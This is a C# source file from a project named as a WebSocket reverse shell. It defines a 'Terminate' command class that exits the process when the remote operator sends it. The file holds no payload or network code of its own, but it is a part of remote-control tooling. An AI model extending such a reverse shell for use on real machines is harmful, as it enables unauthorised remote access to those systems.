using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace WebSocketReverseShellDotNet.service.commands
{
    internal class Terminate : Command
    {
        public string ExecuteCommand(string command)
        {
            Environment.Exit(0);
            return "exit";
        }
    }
}
